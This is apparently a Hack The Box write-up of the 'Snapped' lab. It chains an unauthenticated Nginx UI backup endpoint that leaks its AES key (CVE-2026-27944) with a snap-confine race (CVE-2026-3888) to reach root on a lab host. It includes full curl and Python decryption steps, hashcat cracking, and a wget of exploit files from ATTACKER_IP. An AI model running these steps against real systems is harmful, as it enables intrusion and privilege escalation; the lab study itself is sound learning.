---
title: "HTB Snapped — Nginx UI backup leak to a snapd race condition"
date: 2026-05-18
platform: Hack The Box
difficulty: Hard
os: Linux
category: Offense
summary: "An unauthenticated backup endpoint hands over its own AES key in a response header; root comes from a race between snap-confine and systemd-tmpfiles."
tags: [nginx-ui, cve-2026-27944, aes, bcrypt, hashcat, snapd, cve-2026-3888, race-condition]
attackPath:
  - label: "Vhost fuzzing finds Nginx UI"
    anchor: "enumeration"
  - label: "Backup endpoint leaks its AES key"
    anchor: "foothold-%E2%80%94-cve-2026-27944"
  - label: "Decrypt, crack bcrypt, SSH"
    anchor: "foothold-%E2%80%94-cve-2026-27944"
  - label: "snap-confine race to root"
    anchor: "privilege-escalation-%E2%80%94-cve-2026-3888"
---

Snapped is rated Hard but the community rated the user portion Easy, and that's about right: the foothold is a clean pre-auth bug with one crypto detail that trips people up, and the privilege escalation is a recent snapd CVE whose preconditions the box has already arranged for you. The value here was in understanding *why* each step works.

**Attack path**

```
vhost fuzzing → admin.snapped.htb (Nginx UI 2.3.2)
  → CVE-2026-27944: unauthenticated /api/backup, AES key+IV leaked in a response header
  → decrypt → SQLite users table → bcrypt crack → SSH as jonathan
  → CVE-2026-3888: snap-confine + systemd-tmpfiles race → root
```

## Enumeration

```bash
sudo nmap -p- --min-rate 10000 -oN allports.txt 10.129.61.95
sudo nmap -p 22,80 -sCV -oN targeted.txt 10.129.61.95
```

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | nginx 1.24.0 (Ubuntu) |

Port 80 redirected to `snapped.htb`. The main site was static — nothing from feroxbuster beyond the index and a stylesheet. Vhost fuzzing, filtering on the main site's response size:

```bash
ffuf -u http://snapped.htb/ -H "Host: FUZZ.snapped.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -fs 20199 -fc 302
```

`admin.snapped.htb` → a **Nginx UI** login page, version 2.3.2.

## Foothold — CVE-2026-27944

Nginx UI exposed `/api/backup` without authentication. The endpoint returns a ZIP of encrypted backup files and — this is the bug — leaks the AES-256-CBC key and IV in the `X-Backup-Security` response header, base64-encoded as `key:iv`.

The key is regenerated on every request, so the archive and the header have to come from the same response:

```bash
curl -s -D headers.txt http://admin.snapped.htb/api/backup -o backup.zip
SECURITY=$(grep -i "X-Backup-Security" headers.txt | tr -d '\r' | awk '{print $2}')
KEY_B64=${SECURITY%%:*}
IV_B64=${SECURITY##*:}
```

The outer ZIP is plain; inside are three AES-encrypted files (`nginx-ui.zip`, `nginx.zip`, `hash_info.txt`).

```python
from Crypto.Cipher import AES
import base64, zipfile

key = base64.b64decode(KEY_B64)
iv  = base64.b64decode(IV_B64)

with zipfile.ZipFile("backup.zip") as z:
    for name in z.namelist():
        pt = AES.new(key, AES.MODE_CBC, iv).decrypt(z.read(name))
        open(f"dec_{name}", "wb").write(pt)
```

Both inner ZIPs came back with valid `PK` magic. `dec_nginx-ui.zip` contained `app.ini` (JWT and crypto secrets — not needed) and `database.db`.

```bash
sqlite3 database.db "SELECT name, password FROM users;"
```

Two bcrypt hashes, `admin` and `jonathan`.

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

`jonathan`'s cracked. SSH in, user flag.

## Privilege escalation — CVE-2026-3888

```bash
sudo -l         # nothing
uname -r        # 6.17.0-19-generic
snap version    # snapd 2.63.1+24.04
```

No sudo, Ubuntu 24.04, snapd present, `/usr/lib/snapd/snap-confine` SUID root, a Firefox snap installed, and `systemd-tmpfiles-clean.timer` active. The box name says the rest.

CVE-2026-3888 is an interaction bug between two components that are each fine on their own:

- `snap-confine` (SUID root) creates `/tmp/.snap` when it sets up a snap's sandbox and later bind-mounts from it as root.
- `systemd-tmpfiles` cleans stale entries out of `/tmp`, and on Ubuntu 24.04 that includes `/tmp/.snap` once it's 30 days old.

After cleanup removes the directory, an unprivileged user can recreate it with attacker-controlled contents. The next `snap-confine` run bind-mounts those into the sandbox as root, and a malicious shared object gets loaded with elevated privileges.

On this box `/tmp/.snap` didn't exist at all, so there was no 30-day wait. I used the PoC from TheCyberGeek:

```bash
# attack box
gcc -o exploit exploit_suid.c -lpthread
gcc -shared -fPIC -nostartfiles -o librootshell.so librootshell_suid.c
python3 -m http.server 8080

# target
cd /tmp && wget http://ATTACKER_IP:8080/{exploit,librootshell.so} && chmod +x exploit
./exploit ./librootshell.so
```

The exploit enters the Firefox sandbox and waits for `/tmp/.snap` to be deleted. From a second SSH session I triggered that manually with `rm -rf /tmp/.snap`, the race was won, and a root shell dropped.

## What I took away

- **Vhost enumeration first.** The entire attack surface was behind one hostname.
- Grab the backup and its key atomically. Most of the friction in CVE-2026-27944 is people reusing a stale key from an earlier request and getting garbage.
- `pycryptodome` for AES-CBC beat `openssl enc` here — fewer padding edge cases to argue with.
- Read the CVE's *preconditions*, not just its summary. On a real engagement the `/tmp/.snap` cleanup would mean waiting up to a month or finding another trigger; the lab had already cleared it.
- Hard boxes aren't always hard because of technique. Sometimes the difficulty is in the details.

## References

- [GHSA-g9w5-qffc-6762 — Nginx UI advisory (CVE-2026-27944)](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762)
- [Qualys — CVE-2026-3888](https://blog.qualys.com/vulnerabilities-threat-research/2026/03/17/cve-2026-3888-important-snap-flaw-enables-local-privilege-escalation-to-root)
- [TheCyberGeek — CVE-2026-3888 PoC](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE)
